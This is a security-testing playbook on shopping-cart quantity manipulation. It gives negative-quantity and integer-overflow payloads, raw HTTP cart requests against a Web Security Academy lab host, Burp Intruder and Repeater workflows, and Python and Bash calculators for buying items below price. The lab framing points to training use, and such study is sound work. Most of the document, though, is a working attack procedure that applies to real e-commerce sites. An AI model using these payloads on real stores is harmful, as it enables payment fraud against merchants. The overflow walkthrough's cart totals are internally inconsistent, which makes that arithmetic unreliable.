# Quantity Manipulation (Negative + Overflow)

## When this applies

- Endpoint accepts a `quantity` parameter without enforcing a positive minimum (`quantity >= 1`).
- Server multiplies `price * quantity` for cart total — negative quantity → negative subtotal → cart total reduced.
- Backend uses fixed-width integers (32-bit/64-bit) — repeated additions can wrap around to negative.

## Technique

Two main approaches:
1. **Negative quantity** — supply `quantity=-N` to subtract from cart total or refund.
2. **Integer overflow** — add the maximum-per-request quantity many times until total exceeds `MAX_INT` and wraps to negative.

## Steps

### Negative quantity payloads

```http
# Basic negative values
quantity=-1
quantity=-100
quantity=-999999

# Calculated negative for specific item
# Formula: -(expensive_price / cheap_price) rounded to bring total under limit
quantity=-134  # For $1337 expensive, $10 cheap

# Extreme negative values
quantity=-2147483648  # MIN_INT (32-bit)
quantity=-9223372036854775808  # MIN_LONG (64-bit)
```

### Overflow quantity payloads

```http
# 32-bit integer overflow
quantity=2147483647  # MAX_INT
quantity=2147483648  # MAX_INT + 1 (overflow to negative)

# 64-bit integer overflow
quantity=9223372036854775807  # MAX_LONG
quantity=9223372036854775808  # Overflow

# Repeated additions to cause overflow
quantity=99  # Max per request
# Repeat 16,064 times for $13.37 item
# Results in integer overflow and negative total
```

### Boundary value testing

```http
quantity=0    # Zero
quantity=1    # Minimum valid
quantity=-1   # Just below zero
quantity=99   # Common maximum
quantity=100  # Just above common max
quantity=999  # High valid
quantity=1000 # Above high valid
quantity=999999999  # Extremely high
```

### Negative quantity workflow — 5 minutes

```plaintext
Step 1: Baseline Establishment
Add expensive item to cart (quantity=1)
Note cart total: $1,337

Step 2: Request Capture
Find POST /cart for cheap item
Send to Repeater

Step 3: Calculate Negative Quantity
Formula: -(expensive_price / cheap_price) - buffer
Example: -($1337 / $10) = -134

Step 4: Exploit Execution
Repeater → Change quantity=1 to quantity=-134
Send request
Browser → Refresh cart

Step 5: Fine-Tuning
Adjust negative quantity to bring total to $0-$100
Example: quantity=-130 may result in total=$67
Proceed to checkout
```

### Concrete request sequence

**Request 1: Add expensive item**
```http
POST /cart HTTP/1.1
Host: vulnerable-lab.web-security-academy.net
Cookie: session=aXPdmjKkH7G8jDs9Kf3L2
Content-Type: application/x-www-form-urlencoded

productId=1&redir=PRODUCT&quantity=1
```
Result: Cart total = $1,337.00

**Request 2: Add cheap item with negative quantity**
```http
POST /cart HTTP/1.1
Host: vulnerable-lab.web-security-academy.net
Cookie: session=aXPdmjKkH7G8jDs9Kf3L2
Content-Type: application/x-www-form-urlencoded

productId=2&redir=PRODUCT&quantity=-134
```
Result: Cart total = $1,337 + ($10 × -134) = $1,337 - $1,340 = -$3.00

**Request 3: Fine-tune with positive cheap item**
```http
POST /cart HTTP/1.1
Host: vulnerable-lab.web-security-academy.net
Cookie: session=aXPdmjKkH7G8jDs9Kf3L2
Content-Type: application/x-www-form-urlencoded

productId=2&redir=PRODUCT&quantity=10
```
Result: Cart total = -$3 + ($10 × 10) = $97.00

### Integer overflow workflow — 20 minutes

```plaintext
Step 1: Intruder Configuration
Find: POST /cart request
Send to Intruder (Ctrl+I)
Clear all payload positions (§)
Set: quantity=99 (maximum per request)

Step 2: Payload Setup
Payloads tab → Payload type: Null payloads
Payload options → Continue indefinitely
(We'll stop manually)

Step 3: Resource Pool (CRITICAL)
Resource pool tab
Maximum concurrent requests: 1
Start delay: 0ms

Step 4: Execute Attack
Click: Start attack
New window opens showing requests

Step 5: Monitor for Overflow
Browser → Keep refreshing cart
Watch total increase:
  Request 50:  $6,600
  Request 100: $13,200
  Request 160: $2,147,356,800 (approaching max)
  Request 161: -$2,147,483,648 (OVERFLOW!)

Step 6: Stop and Fine-Tune
Intruder → Stop attack when negative appears
Clear cart
Calculate precise request count needed
Re-run with fixed payload count

Step 7: Adjust to Target
Use Repeater to add specific quantities
Add cheap items to bring total positive
Final total: $0-$100
Complete checkout
```

**Configuration Summary:**
```plaintext
Intruder Settings:
├─ Attack type: Sniper (or any, positions don't matter)
├─ Positions: None (§ cleared)
├─ Payloads:
│  ├─ Type: Null payloads
│  └─ Count: Continue indefinitely
└─ Resource Pool:
   ├─ Max concurrent: 1 ⚠️ CRITICAL
   └─ Delay: 0ms
```

### Negative quantity calculator

```python
#!/usr/bin/env python3

def calculate_negative_quantity(expensive_price, cheap_price, target_total, store_credit):
    """
    Calculate negative quantity needed to bring cart total to affordable amount.
    """
    amount_to_reduce = expensive_price - target_total
    negative_quantity = -(amount_to_reduce / cheap_price)
    negative_quantity = int(negative_quantity)
    final_total = expensive_price + (cheap_price * negative_quantity)

    print(f"Expensive item: ${expensive_price}")
    print(f"Cheap item: ${cheap_price}")
    print(f"Target total: ${target_total}")
    print(f"Store credit: ${store_credit}")
    print(f"\nNegative quantity needed: {negative_quantity}")
    print(f"Resulting total: ${final_total}")

    if 0 < final_total <= store_credit:
        print(f"Total is affordable")
    else:
        print(f"Adjust values - total not in range")

    return negative_quantity

calculate_negative_quantity(
    expensive_price=1337,
    cheap_price=10,
    target_total=67,
    store_credit=100
)
```

### Bash overflow calculator

```bash
#!/bin/bash

ITEM_PRICE=133700  # Price in cents ($1,337.00)
MAX_INT=2147483647  # 32-bit signed integer max
MAX_QUANTITY_PER_REQUEST=99

items_needed=$((MAX_INT / ITEM_PRICE + 1))
echo "[*] Item price: $ITEM_PRICE cents"
echo "[*] Max 32-bit int: $MAX_INT"
echo "[*] Items needed for overflow: $items_needed"

requests_needed=$((items_needed / MAX_QUANTITY_PER_REQUEST + 1))
echo "[*] Max quantity per request: $MAX_QUANTITY_PER_REQUEST"
echo "[*] Requests needed: $requests_needed"

total_items=$((requests_needed * MAX_QUANTITY_PER_REQUEST))
raw_total=$((total_items * ITEM_PRICE))
echo "[*] Total items: $total_items"
echo "[*] Raw total (before overflow): $raw_total cents"

echo ""
echo "=== Burp Intruder Configuration ==="
echo "Attack type: Sniper"
echo "Payload type: Null payloads"
echo "Payload count: $requests_needed"
echo "Resource pool: Max concurrent requests = 1"
echo "Request body: quantity=$MAX_QUANTITY_PER_REQUEST"
```

## Verifying success

- Cart total goes negative or wraps from a very large positive to a small/negative value.
- Checkout completes at the manipulated total.
- Order confirmation reflects the reduced price.

## Common pitfalls

- Some apps cap `quantity >= 0` server-side but not `<= 99` — use overflow path instead.
- Concurrent requests during overflow attack can race and miss the wrap point — set `concurrent=1`.
- Some backends use BigInteger (no overflow) — try negative path instead.

## Tools

- Burp Suite Intruder (null payloads + concurrent=1)
- Burp Suite Repeater
- Python `requests`
- Bash + curl
